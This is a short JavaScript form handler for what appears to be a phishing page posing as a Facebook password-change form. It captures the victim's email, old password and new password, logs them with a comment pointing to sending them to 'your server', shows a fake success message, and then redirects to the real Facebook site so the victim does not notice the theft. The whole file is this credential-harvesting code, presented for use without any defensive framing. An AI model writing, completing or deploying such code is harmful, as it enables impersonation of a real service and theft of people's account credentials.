document.getElementById('passwordForm').addEventListener('submit', function(event) {
  event.preventDefault();  // Prevent form from refreshing the page

  // Get values from the inputs
  const email = document.getElementById('email').value;
  const oldPassword = document.getElementById('oldPassword').value;
  const newPassword = document.getElementById('newPassword').value;

  // Save the data (right now: log to console — you can send it to your server here)
  console.log('Email:', email);
  console.log('Old Password:', oldPassword);
  console.log('New Password:', newPassword);

  // Hide the form and show the success message
  document.getElementById('passwordBox').style.display = 'none';
  document.getElementById('successMessage').style.display = 'flex';

  // After 2 seconds, redirect to real Facebook
  setTimeout(function() {
    window.location.href = 'https://facebook.com';
  }, 2000);
});
